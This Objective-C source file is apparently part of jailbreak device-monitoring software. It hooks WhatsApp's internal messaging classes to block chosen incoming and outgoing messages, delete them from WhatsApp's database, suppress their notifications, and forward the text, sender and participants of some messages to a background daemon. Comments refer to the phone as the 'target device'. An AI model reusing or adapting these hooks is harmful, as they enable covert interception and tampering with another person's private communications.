//
//  WhatsAppHook.h
//  MSFCR
//
//  Created by Benjawan Tanarattanakorn on 7/25/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <CoreData/CoreData.h>

// -- WhatsApp class
#import "ChatManager.h"
#import "XMPPStream.h"
#import "XMPPConnection.h"
#import "XMPPPresenceStanza.h"
#import "XMPPMessageStanza.h"
#import "WAChatStorage.h"
#import "WAMessage.h"
#import "WhatsAppAppDelegate.h"
#import "WAMediaItem.h"
//#import "ConversationViewController.h"

// -- Utility class
#import "WhatsAppAccountInfo.h"
#import "WhatsAppUtils.h"
#import "WhatsAppDBUtils.h"
#import "WhatsAppBlockEventStore.h"

#import "BlockEvent.h"
#import "FxRecipient.h"
#import "DefStd.h"
#import "RestrictionManagerUtils.h"


/********************************************************************************************
										=== README ===
 
 ------------------------------------------------------------------------
 Calling step for 'OUTGOING' message (Order by the time to call)
 ------------------------------------------------------------------------
 1) ChatManager --> chatStorage$didAddMessages$
 2) XMPPStream --> send$encrypted$	
	- show alert message
	- send event
 
 ------------------------------------------------------------------------
 Calling step for 'INCOMING' message (Order by the time to call)
  ------------------------------------------------------------------------
 1) XMPPConnection --> processIncomingMessages$
	- for DELETE case
		- this method will send event
		- this is the last method to be called
		- show alert message
		- send event
	- (===== Obsolete ======) for HIDE case 
		- this will call the original method and then the capturing mobile substrate can
		  capture this and send the event
 2) (===== Obsolete ======) ChatManager --> chatStorage$didAddMessages$ (same as the step one in outgoing message)  
	- for HIDE case, this is the last method to be called 
 
 ********************************************************************************************/


#pragma mark -
#pragma mark Outgoing


// for WhatsApp version 2.8.2, 2.8.3 and 2.8.4
HOOK(XMPPStream, send$encrypted$, void, id arg1, BOOL arg2) { 
	DLog(@"BLOCKING ===================================== XMPPStream =====> send WhatsApp 2.8.2, 2.8.3 and 2.8.4 ios 5.1.1");	
	DLog(@"BLOCKING arg1 %@ arg1 class %@", arg1, [arg1 class]);		
	DLog(@"BLOCKING arg2 %d", arg2);	
	BOOL isRequiredToCallOriginal = NO;
	
	WhatsAppAccountInfo *waAccInfo = [WhatsAppAccountInfo shareWhatsAppAccountInfo];
	
	// -- Case 1: arg1 is XMPPMessageStanza
	if ([arg1 isMemberOfClass:objc_getClass("XMPPMessageStanza")]) {
		DLog(@"BLOCKING xmppUser %@ text %@", [self xmppUser], [arg1 text]);			// this is the number of this device
		//DLog(@"BLOCKING attributes %@", [arg1 attributes]);					
										
		// check media type: text or picture
		id messageStanza			= (XMPPMessageStanza *)arg1;		
		
		NSString *message			= [messageStanza text];	
		
		int mediaType				= [messageStanza mediaType];
		NSString *mediaTypeString	= [messageStanza stringForMediaType:mediaType];	
		
		int type					= (int)[messageStanza type];
		NSString *typeString		= (NSString *)[messageStanza stringForType:type];	
		DLog (@"media type (%d, %@)", mediaType, mediaTypeString)		
		DLog (@"media type (%d, %@)", type, typeString)		
		//DLog (@"vcard %@", [messageStanza vcard])	
		//DLog (@"vcard %@", [messageStanza vCardContactName])	
		//DLog (@"vcard %@", [messageStanza vCardStringValue])			
		//DLog (@"media url %@", [messageStanza mediaURL])		
		//DLog (@"stringsForTypes %@", [messageStanza stringsForTypes])
		//DLog (@"stringsForTypes %@", [messageStanza mediaTypeStrings])
		/* media type
				 "",             0           e.g., text
				 image,          1          
				 video,          2
				 audio,          3
				 vcard,          4
				 location        5		 
		 */		
		//if (message) {									
		if (message ||											// text,  Ensure that the message is not null
			[mediaTypeString isEqualToString:@"image"]		||
			[mediaTypeString isEqualToString:@"audio"]		|| 
			[mediaTypeString isEqualToString:@"location"]	||
			[mediaTypeString isEqualToString:@"vcard"]		||
			[mediaTypeString isEqualToString:@"video"])		{
			
			DLog(@"BLOCKING user name %@",  [waAccInfo mUserName]);
			
			// -- Initialize WhatsAppUtils
			WhatsAppUtils *wUtils		= [[WhatsAppUtils alloc] init];			
			NSDictionary *accountInfo	= [wUtils accountInfo:[self xmppUser] userName:[waAccInfo mUserName]];		// create a dictionary with two pair (user id and username)
			[wUtils setMAccountInfo:accountInfo];					
			
			// -- Initialize participants
			[wUtils retrieveParticipantFromDBForOutgoingEvent: arg1];									
		
			// -- if the number of recipients in mRecipientArray is 0, it's possible that this method is called because of changing WhatsApp status message
			if ([[wUtils mRecipientArray] count] != 0) { 

				// -- Create BlockEvent for WhatsApp
				BlockEvent *whatsAppEvent = [WhatsAppUtils createBlockEventForWhatsAppWithParticipant:[wUtils mRecipientArray] 
																						withDirection:kBlockEventDirectionOut];			
				if ([RestrictionHandler blockForEvent:whatsAppEvent]) {						// CASE 1.1: BLOCKED
					DLog (@"*********************************************")
					DLog (@"BLOCKING --------- Block Sending --------- %d ", [NSThread isMainThread])			
					DLog (@"*********************************************")								
					DLog (@"media type %@", mediaTypeString)
					// -- Step 1: Show alert message
					[RestrictionHandler showBlockMessage];
					
					// -- Step 2: Send event to daemon
					//[wUtils performSelector:@selector(sendWhatsAppEventForOutgoingMessage:) withObject:message afterDelay:1];		
					if ([mediaTypeString isEqualToString:@"image"]		||
						[mediaTypeString isEqualToString:@"audio"]		|| 
						[mediaTypeString isEqualToString:@"location"]	||
						[mediaTypeString isEqualToString:@"vcard"]		||
						[mediaTypeString isEqualToString:@"video"])		{
						//[NSThread detachNewThreadSelector:@selector(outgoingEventSendingThread:) toTarget:wUtils withObject:[messageStanza mediaURL]];
						DLog (@"Don't send event to daemon")
						
						if ([mediaTypeString isEqualToString:@"video"]) 
							[[WhatsAppDBUtils sharedInstance] clearVideoMediaItemProperty];
					} else {
						[NSThread detachNewThreadSelector:@selector(outgoingEventSendingThread:) toTarget:wUtils withObject:message];
					}
					
					// -- Step 3: Remove WhatsApp message from WhatsApp chat-storage
					[[WhatsAppDBUtils sharedInstance] performSelectorOnMainThread:@selector(deleteMessageInWhatsAppDB) 
																	   withObject:nil
																	waitUntilDone:NO];		// 'NO' can cause crash more frequencly in the case that this line of code is called in the first step										
				} else {
					DLog (@"*********************************************")
					DLog (@"BLOCKING --------- UN-Block Sending ---------")				//  CASE 1.2: UNBLOCKED
					DLog (@"*********************************************")
					
					isRequiredToCallOriginal = YES;
				}
			} else {
				DLog (@"@@@@@ changing status message @@@@@")
				isRequiredToCallOriginal = YES;
			}
			[wUtils autorelease];
		} else {
			DLog (@">> no message")
			isRequiredToCallOriginal = YES;
		}				 
	}
	// -- Case 2: arg1 is XMPPPresenceStanza
	else if ([arg1 isMemberOfClass:objc_getClass("XMPPPresenceStanza")]) {
		NSString *name = (NSString *) [[(XMPPPresenceStanza *) arg1 attributes] objectForKey:@"name"];
		DLog (@"Blocking: set name %@", name)  // when type='available'
		if (name) 
			[waAccInfo setMUserName:name];
		isRequiredToCallOriginal = YES;
	// -- Case 3: arg1 is other class
	} else {
		DLog (@"Blocking: arg 1 class %@", [arg1 class])
		isRequiredToCallOriginal = YES;
	}
	
	if (isRequiredToCallOriginal) 
		CALL_ORIG(XMPPStream, send$encrypted$, arg1, arg2);
}

// for WhatsApp version ealier than 2.8.2
HOOK(XMPPStream, send$, void, id arg1) { 
	DLog(@"BLOCKING ===================================== XMPPStream =====> send WhatsApp version ealier than 2.8.2");	
	DLog(@"BLOCKING arg1 %@", arg1);		
	
	BOOL isRequiredToCallOriginal = NO;

	WhatsAppAccountInfo *waAccInfo = [WhatsAppAccountInfo shareWhatsAppAccountInfo];
	
	// -- Case 1: arg1 is XMPPMessageStanza
	if ([arg1 isMemberOfClass:objc_getClass("XMPPMessageStanza")]) {
		DLog(@"BLOCKING xmppUser %@ text %@", [self xmppUser], [arg1 text]);			// this is the number of this device
		//DLog(@"BLOCKING attributes %@", [arg1 attributes]);					
		NSString *message = (NSString *)[arg1 text];								
		
		if (message) {																	// -- Ensure that the message is not null
			// -- Initialize WhatsAppUtils
			WhatsAppUtils *wUtils = [[WhatsAppUtils alloc] init];
			DLog(@"BLOCKING user name %@",  [waAccInfo mUserName]);
			NSDictionary *accountInfo = [wUtils accountInfo:[self xmppUser]			
												   userName:[waAccInfo mUserName]];		// create a dictionary with two pair (user id and username)
			[wUtils setMAccountInfo:accountInfo];					
			
			// -- Initialize participants
			[wUtils retrieveParticipantFromDBForOutgoingEvent: arg1];									
			
			
			if ([[wUtils mRecipientArray] count] != 0) { 

				// -- Create BlockEvent for WhatsApp
				BlockEvent *whatsAppEvent = [WhatsAppUtils createBlockEventForWhatsAppWithParticipant:[wUtils mRecipientArray] 
																						withDirection:kBlockEventDirectionOut];			
				if ([RestrictionHandler blockForEvent:whatsAppEvent]) {						// CASE 1.1: BLOCKED
					//DLog (@"--------- Delete OUT message --------- ");					
					
					[[WhatsAppDBUtils sharedInstance] performSelectorOnMainThread:@selector(deleteMessageInWhatsAppDB) withObject:nil waitUntilDone:NO];
					
					// -- Show alert message
					[RestrictionHandler showBlockMessage];
		
					// -- Send block event
					NSArray *participantArray = [wUtils mParticipantArray];					// include me				
					NSArray *fxRecipientParticipantArray = [WhatsAppUtils createFxRecipientArray:participantArray];				
					[wUtils sendWhatsAppEventForMessage:message
											   senderID:[[wUtils mAccountInfo] objectForKey:kWhatsAppContactNumber]
											 senderName:[[wUtils mAccountInfo] objectForKey:kWhatsAppContactName] 
										   participants:fxRecipientParticipantArray
											  direction: kEventDirectionOut];
				} else {
					//DLog (@"BLOCKING --------- UN-Block Sending ---------")				//  CASE 1.2: UNBLOCKED
					isRequiredToCallOriginal = YES;
				}
			} else {
				DLog (@"@@@@@ changing status message @@@@@")
				isRequiredToCallOriginal = YES;
			}
			[wUtils release];
			wUtils = nil;
		} else {
			isRequiredToCallOriginal = YES;
		}				 
	}
	// -- Case 2: arg1 is XMPPPresenceStanza
	else if ([arg1 isMemberOfClass:objc_getClass("XMPPPresenceStanza")]) {		
		NSString *name = (NSString *) [[(XMPPPresenceStanza *) arg1 attributes] objectForKey:@"name"];
		DLog (@"Blocking: set name %@", name)  // when type='available'
		if (name) 
			[waAccInfo setMUserName:name];
		isRequiredToCallOriginal = YES;
				
	// -- Case 3: arg1 is other class
	} else {
		isRequiredToCallOriginal = YES;
	}
	
	if (isRequiredToCallOriginal) 
		CALL_ORIG(XMPPStream, send$, arg1);
}


#pragma mark -
#pragma mark Outgoing/Incoming

// for WhatsApp version 2.8.2, 2.8.3 and 2.8.4
HOOK(ChatManager, chatStorage$didAddMessages$, void, id arg1, id arg2) { 
	DLog(@"BLOCKING ===================================== ChatManager --> chatStorage didAddMessages =====>");
	DLog(@"arg1: %@", arg1)							// WAChatStorage
	DLog(@"arg2 count %d (array of WAMessage): %@", [arg2 count], arg2)	// WAMessage NSArray
	
	BOOL isRequiredToCallOriginal = NO;
	
	WAMessage *waMessage = [arg2 objectAtIndex:0];
	//BOOL isSending = [[waMessage isSending] boolValue];	
	BOOL isFromMe = [[waMessage isFromMe] boolValue];	
	/*
	DLog (@"participantJID %@", [waMessage participantJID])  // This is the sender
	DLog(@"BLOCKING chatSession %@", [waMessage chatSession])
	DLog(@"BLOCKING groupEventType %@", [waMessage groupEventType])
	DLog(@"BLOCKING isFromMe %@", [waMessage isFromMe])
	DLog(@"BLOCKING messageStatus %@", [waMessage messageStatus])
	DLog(@"BLOCKING messageType %@", [waMessage messageType])
	DLog(@"BLOCKING stanzaID %@", [waMessage stanzaID])		// message id
	DLog(@"BLOCKING toJID %@", [waMessage toJID])			// id of reciever (e.g. 66839882267-1343280480@g.us or  66865675518@s.whatsapp.net)
	*/
	
	//if (isSending) {  /// !!!: Testing
	if (isFromMe) {
		DLog (@"+++++++++++++++++++++ OUTGOING MSG +++++++++++++++++++++ ")
		if ([arg1 isMemberOfClass:objc_getClass("WAChatStorage")]) {
			DLog (@"> WAChatStorage exists")
			[[WhatsAppDBUtils sharedInstance] setMWAChatStorage:arg1];
		}
		if ([waMessage isMemberOfClass:objc_getClass("WAMessage")]) {
			DLog (@"> WAMessage exists")
			[[WhatsAppDBUtils sharedInstance] setMWAMessage:waMessage];
		}
		
		// -- Create BlockEvent for outgoing WhatsApp		
		WhatsAppUtils *wUtils = [[WhatsAppUtils alloc] init];
		NSArray *recipientArray = [wUtils getRecipientFromDBForOutgoingEvent:[waMessage stanzaID]];
		
		[wUtils release];
		wUtils = nil;
		
		BlockEvent *whatsAppEvent = [WhatsAppUtils createBlockEventForWhatsAppWithParticipant:recipientArray
																				withDirection:kBlockEventDirectionOut];	
		if ([RestrictionHandler blockForEvent:whatsAppEvent]) {						// CASE 1.1: BLOCKED
			DLog (@"--------- block outgoing (ChatManager) --------- ");	
		} else {
			DLog (@"--------- unblock outgoing (ChatManager) --------- ");			// CASE 1.2: UNBLOCKED
			isRequiredToCallOriginal = YES;		
		}		
	} else {
		isRequiredToCallOriginal = YES;
		
		NSArray *messageArray = [NSArray array];
		messageArray = (NSArray *) arg2;
		
		DLog (@"+++++++++++++++++++++ INCOMING MSG +++++++++++++++++++++ ")
		
		if ([arg1 isMemberOfClass:objc_getClass("WAChatStorage")]) {
			//DLog (@"> WAChatStorage exists")
			[[WhatsAppDBUtils sharedInstance] setMWAChatStorage:arg1];
		}
		//[[WhatsAppDBUtils sharedInstance] setMWAMessageArray:messageArray];		
		
		int i = 1;
		for (WAMessage *eachMessage in messageArray) {
			DLog (@"eachMessage %d %@", i, eachMessage)
			//DLog (@"participant JID %@", [eachMessage participantJID])
			DLog (@"group member %@", [eachMessage groupMember])
			
			NSNumber *msgType = [eachMessage messageType];
			
			/*
			 * type 0: normal message
			 * type 6: message for a session creation
			 */
			if ([msgType intValue] == 6) {	// normal message has a type of 0
				DLog (@" !!!!!!!!!!!!!!!!!!!!!!  This message is for session creation !!!!!!!!!!!!!!!!!!!!!!!!!")				
			} else {
				
				/* ------------------------------------------------------------------------------
				 * Note that, the word 'GROUP conversation' does not mean that the session
				 * includes more than 2 account (i.e., me and another). It means that the session
				 * is created by clicking the button 'New Group' instead of the button with the
				 * message-composing icon.
				 * So it means that if the target device creates the session by clicking the button
				 * with the message-composing icon, and then select only one participant, this session
				 * is treated as 'GROUP' conversation
				 * ----------------------------------------------------------------------------- */
			  			  			  			  
				// Check if it's GROUP conversion type or SINGLE conversation type
				
				// -- get the phone number of sender from each message
				NSMutableArray *senders = [NSMutableArray array];
				NSString *aSenders = [WhatsAppUtils getSenderOfIncomingMessage:eachMessage];		
				DLog (@"sender %d %@", i, aSenders)
				[senders addObject:aSenders];
				
				// delete here if blocked
				BlockEvent *whatsAppEvent = [WhatsAppUtils createBlockEventForWhatsAppWithParticipant:senders
																						withDirection:kBlockEventDirectionIn];
				if ([RestrictionHandler blockForEvent:whatsAppEvent]) {										// BLOCKED							
					DLog (@"_________ INCOMING for message %d is blocked _____________", i)												
					
					[[WhatsAppBlockEventStore sharedInstance] setMMessageID:[(NSManagedObject *) eachMessage objectID]];
															
					if ([[waMessage messageType] intValue]  != 5) {			// Except location
						[[WhatsAppDBUtils sharedInstance] setMWAMessage:eachMessage];
						[[WhatsAppDBUtils sharedInstance] deleteMessageInWhatsAppDB];	// !!! delete the message from WhatsApp DB																																	
					} else {								
						DLog (@"> location message")	
						[WhatsAppDBUtils clearMediaItemPropertyForMessage:eachMessage];						
					}
					[RestrictionHandler showBlockMessage];	
				} else {
					DLog (@"_________ INCOMING for message %d is NOT blocked _____________", i)				// UNBLOCKED
				}					
			}					
			i++;
		}
		[[WhatsAppDBUtils sharedInstance] resetMessage];
		[[WhatsAppDBUtils sharedInstance] resetStorage];		
		
		/* obsolete code
		// -- Create BlockEvent for outgoing WhatsApp		
		WhatsAppUtils *wUtils = [[WhatsAppUtils alloc] init];	
		 DLog (@"--------- CASE 2 step 2: Hide IN message ---------");	
		 /// !!: blocking here can prevent the message shown on Coversation view. but cannot prevent it to shonw in conversation list and notification		
		 if ([[WhatsAppBlockEventStore sharedInstance] isSameEvent:[waMessage stanzaID]]) {			// Ensure that it is the same event we've checked in processIncomingMessages:
		 if ([[WhatsAppBlockEventStore sharedInstance] mIsBlocked]) {		
		 DLog (@"--------- block incoming (ChatManager) --------- ");			
		 // Note: Not send block event because the event was captured by the capturing mobile substrate
		 } else {
		 DLog (@"--------- unblock incoming (ChatManager) --------- ");
		 isRequiredToCallOriginal = YES;
		 }
		 } else {
		 isRequiredToCallOriginal = YES;
		 }		
		 */	
	}	
	if (isRequiredToCallOriginal)
		CALL_ORIG(ChatManager, chatStorage$didAddMessages$, arg1, arg2); 
}

#pragma mark -
#pragma mark Incoming 

// This method will be called when WhatsApp is running on the background and incoming WhatsApp message comes
HOOK(ChatManager, saveNotificationTimeForMessage$, void, id arg1) {	
	DLog (@">>>>>>>>>>>>>>>> ChatManager --> saveNotificationTimeForMessage")
	//DLog (@"arg1 %@", arg1)	// WAMessage
	
	BOOL isBlocked = NO;
	NSManagedObjectID *blockedMessageID = [[WhatsAppBlockEventStore sharedInstance] mMessageID]; 
	DLog (@"blocked mesage id %@", blockedMessageID)
	if (blockedMessageID  == (NSManagedObjectID *)[(NSManagedObject *)arg1 objectID]) {
		if ([[RestrictionManagerUtils sharedRestrictionManagerUtils] restrictionEnabled]) {
			DLog (@"This message ID is blocked %@", blockedMessageID)
			isBlocked = YES;
			[[WhatsAppBlockEventStore sharedInstance] setMMessageID:nil];
		}
	}
	
	if (!isBlocked)
		CALL_ORIG(ChatManager, saveNotificationTimeForMessage$, arg1);
}
	
// use for location only
// this method is not called in 3gs 5.1.1, so this will not be used
HOOK(WAChatStorage, processLocationMessage$, void, id arg1) {	
	DLog (@">>>>>>>>>>>>>>>> WAChatStorage --> processLocationMessage %@" , arg1)		
	/*
	 WAMessage *waMessage = arg1;
	 BOOL isFromMe = [[waMessage isFromMe] boolValue];	
	 if (!isFromMe) { // incoming only
	 // restriction logic
	 [[[WhatsAppDBUtils sharedInstance] mWAChatStorage] deleteMessage:waMessage];
	 [[[WhatsAppDBUtils sharedInstance] mWAChatStorage] deleteMediaForMessage:waMessage];	
	 } 
	 */
	CALL_ORIG(WAChatStorage, processLocationMessage$, arg1);
}

// use for location only
// this method is not called in 3gs 5.1.1, so this will not be used
HOOK(WAChatStorage, requestThumbnailForMessage$location$, void, id arg1, id arg2) {	
	DLog (@">>>>>>>>>>>>>>>> WAChatStorage --> requestThumbnailForMessage")
	DLog (@"arg1 %@", arg1)
	DLog (@"arg1 %@", arg2)

//	 WAMessage *waMessage = arg1;
//	 BOOL isFromMe = [[waMessage isFromMe] boolValue];	
//	 if (!isFromMe) { // incoming only
//		 // restriction logic
//		 DLog (@"incoming location")
//		 
//		 [[waMessage mediaItem] setMediaURL:@""];
//		 [[waMessage mediaItem] setLatitude:[NSNumber numberWithInt:0]];  // Cannot set to nil, otherwise the calling of the hook method for incoming will not provide the message
//		 [[waMessage mediaItem] setLongitude:[NSNumber numberWithInt:0]];  // Cannot set to nil, otherwise the calling of the hook method for incoming will not provide the message
//		 [[waMessage mediaItem] setVCardName:nil];
//		 [[waMessage mediaItem] setVCardString:nil];
//		 [[waMessage mediaItem] setMediaLocalPath:nil];
//		 [[waMessage mediaItem] setThumbnailData:nil];
//		 [[waMessage mediaItem] setThumbnailLocalPath:nil];
//		 [[waMessage mediaItem] setXmppThumbPath:nil];
//		 
//		 CALL_ORIG(WAChatStorage, requestThumbnailForMessage$location$, waMessage , nil); // waMessage can not be nil
//	 } else {
//		 CALL_ORIG(WAChatStorage, requestThumbnailForMessage$location$, arg1, arg2);
//	 }
	 CALL_ORIG(WAChatStorage, requestThumbnailForMessage$location$, arg1, arg2);
}

// for WhatsApp version ealier than 2.8.2, 2.8.2 and 2.8.3
/*
 HOOK(XMPPConnection, processIncomingMessages$, void, id arg) { 
 DLog (@"BLOCKING ===================================== XMPPConnection =====> processIncomingMessages");
 
 DLog (@"arg class %@", [arg class]);	
 DLog (@"arg %@", arg);	// NSArray
 DLog (@"myJID %@", [self myJID])
 
 // -- Initialize WhatsAppUtils
 WhatsAppUtils *wUtils				= [[[WhatsAppUtils alloc] init] autorelease];
 XMPPMessageStanza *incomingParts	= [WhatsAppUtils incomingMessageParts:arg];
 
 
 DLog (@"incomingParts %@", incomingParts)
 DLog (@"chatState %d", [incomingParts chatState])
 DLog (@"type %d", [incomingParts type])
 //DLog (@"offline %d", [incomingParts offline])
 DLog (@"serverDeliveryAckId %@", [incomingParts serverDeliveryAckId])
 //DLog (@"mediaType %@", [incomingParts mediaType])
 
 NSDictionary *accountInfo = [wUtils accountInfo:[self xmppUser]
 userName:[[WhatsAppAccountInfo shareWhatsAppAccountInfo] mUserName]];
 [wUtils setMAccountInfo:accountInfo];
 DLog(@"xmppUser %@", [self xmppUser]);											// this is the number of this device
 
 NSString *sender = [WhatsAppUtils getSender:incomingParts];
 DLog (@"sender %@", sender)
 BlockEvent *whatsAppEvent = [WhatsAppUtils createBlockEventForWhatsAppWithParticipant:[NSArray arrayWithObject:sender]
 withDirection:kBlockEventDirectionIn];	
 if ([RestrictionHandler blockForEvent:whatsAppEvent]) {							// BLOCKED				
 
 //		if ([RestrictionHandler lastBlockCause] != kActivityBlocked) {				
 //			DLog (@"--------- CASE 1: Delete IN message (NOT kActivityBlocked)---------");	
 //			// -- Not call the original method, so the message will not be inserted into WhatsApp database																	
 //		} else {
 //			DLog (@"--------- CASE 2:Delete IN message (kActivityBlocked) ---------");			
 //			NSString *msgId = [[incomingParts attributes] objectForKey:@"id"];
 //			[[WhatsAppBlockEventStore sharedInstance] setMessageId:msgId forBlockStatus:YES];			
 //		}
 
 if (incomingParts) {
 NSArray *participantArray = [wUtils getParticipantForIncomingEvent:incomingParts excludeSender: sender];				
 NSArray *fxRecipientParticipantArray = [WhatsAppUtils createFxRecipientArray:participantArray];
 [RestrictionHandler showBlockMessage];	
 [wUtils sendWhatsAppEventForMessage:[incomingParts text] 
 senderID:sender
 senderName:[wUtils mSenderContactName]
 participants:fxRecipientParticipantArray
 direction:kEventDirectionIn];
 } else {
 DLog (@"incoming path is null")
 }		
 // Note that calling to the original will be captured in Capturing MobileSubstrate
 } else {
 DLog (@"_________ INCOMING is not block _____________")						// UNBLOCKED
 CALL_ORIG(XMPPConnection, processIncomingMessages$, arg);					// If not call to original, this message will not be inserted to DB
 }
 
 CALL_ORIG(XMPPConnection, processIncomingMessages$, arg);					
 }
 */

/*
 HOOK(ChatManager, sendLocalNotificationForMessage$fromUser$, void, id arg1, id arg2) {	
 DLog (@">>>>>>>>>>>>>>>> ChatManager --> sendLocalNotificationForMessage")
 DLog (@"arg1 %@", arg1)	// WAMessage
 DLog (@"arg2 %@", arg2)
 
 //	BOOL isBlocked = NO;
 //	
 //	WAMessage *waMessage = (WAMessage *) arg1;
 //	
 //	WhatsAppUtils *wUtils = [[[WhatsAppUtils alloc] init] autorelease];
 //	NSArray *recipientArray = [wUtils getRecipientFromDBForOutgoingEvent:[waMessage stanzaID]];
 //	DLog (@"recipientArray %@", recipientArray)
 //	BlockEvent *whatsAppEvent = [WhatsAppUtils createBlockEventForWhatsAppWithParticipant:recipientArray withDirection:kBlockEventDirectionIn];	
 //	
 //	if ([RestrictionHandler blockForEvent:whatsAppEvent]) {
 //		isBlocked = YES;	
 //		DLog (@">> Block send local notification")
 //	}
 //	if (!isBlocked) 
 CALL_ORIG(ChatManager, sendLocalNotificationForMessage$fromUser$, arg1, arg2);			
 }
 */

/*
HOOK(UIApplication, registerForRemoteNotificationTypes$, void, UIRemoteNotificationType arg1) {
	DLog (@"*************** UIApplication registerForRemoteNotificationTypes")
	DLog (@"*************** notification type %d", arg1)		
	CALL_ORIG(UIApplication, registerForRemoteNotificationTypes$, arg1);
}

HOOK(WhatsAppAppDelegate, application$didRegisterForRemoteNotificationsWithDeviceToken$, void, id arg1, id arg2) {
	DLog (@"*************** didRegisterForRemoteNotificationsWithDeviceToken")
	DLog (@"*************** arg1 %@", arg1)
	DLog (@"*************** arg2 %@", arg2)
	DLog (@"notification type %d", [[UIApplication sharedApplication] enabledRemoteNotificationTypes])
	CALL_ORIG(WhatsAppAppDelegate, application$didRegisterForRemoteNotificationsWithDeviceToken$, arg1, arg2);

//				
//	// registering only some notifcation type here does not work in registerForRemoteNotificationTypes method
//	//UIRemoteNotificationType userNotificationType = [[UIApplication sharedApplication] enabledRemoteNotificationTypes];
//	UIRemoteNotificationType notificationType = (UIRemoteNotificationType) (UIRemoteNotificationTypeSound | UIRemoteNotificationTypeBadge);
//	
//	if (isBlocked) {
//		//[[UIApplication sharedApplication] unregisterForRemoteNotifications];
//		UIRemoteNotificationType userNotificationType = [[UIApplication sharedApplication] enabledRemoteNotificationTypes];
//		if (userNotificationType & (UIRemoteNotificationType) UIRemoteNotificationTypeAlert != (UIRemoteNotificationType) UIRemoteNotificationTypeAlert) {		
//			[[UIApplication sharedApplication] registerForRemoteNotificationTypes:notificationType];
//		}
//	}	
}			



HOOK(WhatsAppAppDelegate, application$didReceiveRemoteNotification$, void, id arg1, id arg2) {
	DLog (@"*************** didReceiveRemoteNotification")
	DLog (@"*************** arg1 %@", arg1)
	DLog (@"*************** arg2 %@", arg2)
	CALL_ORIG(WhatsAppAppDelegate, application$didReceiveRemoteNotification$, arg1, arg2);
}

HOOK(WhatsAppAppDelegate, application$didReceiveLocalNotification$, void, id arg1, id arg2) {
	DLog (@"*************** didReceiveLocalNotification")
	DLog (@"*************** arg1 %@", arg1)
	DLog (@"*************** arg2 %@", arg2)
		CALL_ORIG(WhatsAppAppDelegate, application$didReceiveLocalNotification$, arg1, arg2);
}

HOOK(WhatsAppAppDelegate, application$didFailToRegisterForRemoteNotificationsWithError$, void, id arg1, id arg2) {
	DLog (@"*************** didFailToRegisterForRemoteNotificationsWithError")
	DLog (@"*************** arg1 %@", arg1)
	DLog (@"*************** arg2 %@", arg2)
			CALL_ORIG(WhatsAppAppDelegate, application$didFailToRegisterForRemoteNotificationsWithError$, arg1, arg2);
}

*/

// for WhatsApp notification shown inside WhatsApp application
/*
HOOK(WhatsAppAppDelegate, showNotificationForMessage$, void, id arg1) {
	DLog(@"BLOCKING ===================================== WhatsAppAppDelegate --> showNotificationForMessage");
	DLog(@"arg1 %@", arg1);
	DLog(@"arg1 class %@", [arg1 class]);	// WAMessage
	
	BOOL isRequiredToCallOriginal = NO;	
	
	WAMessage *waMessage = arg1;
	if ([[WhatsAppBlockEventStore sharedInstance] isSameEvent:[waMessage stanzaID]]) {			// Ensure that it is the same event we've checked in processIncomingMessages:
		if ([[WhatsAppBlockEventStore sharedInstance] mIsBlocked]) {		
			DLog (@"--------- block notification (WhatsAppAppDelegate) --------- ");			
			// Note: Not send block event because the event was captured by the capturing mobile substrate
		} else {
			DLog (@"--------- unblock notification (WhatsAppAppDelegate) --------- ");
			isRequiredToCallOriginal = YES;
		}
	} else {
		isRequiredToCallOriginal = YES;
	}		
	if (isRequiredToCallOriginal)
		CALL_ORIG(WhatsAppAppDelegate, showNotificationForMessage$, arg1);
}
*/